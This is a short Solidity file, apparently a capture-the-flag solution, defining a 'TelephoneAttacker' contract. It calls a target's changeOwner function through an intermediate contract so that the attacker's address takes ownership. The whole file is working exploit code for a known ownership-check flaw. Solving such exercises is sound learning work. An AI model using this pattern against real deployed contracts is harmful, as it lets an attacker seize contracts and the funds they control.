// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Telephone {

 function owner() external view returns (address);
 function changeOwner(address _owner) external; 
}

contract TelephoneAttacker{

    function attack(address _address) public {
        Telephone telephone = Telephone(_address);
        telephone.changeOwner(msg.sender);
    }
}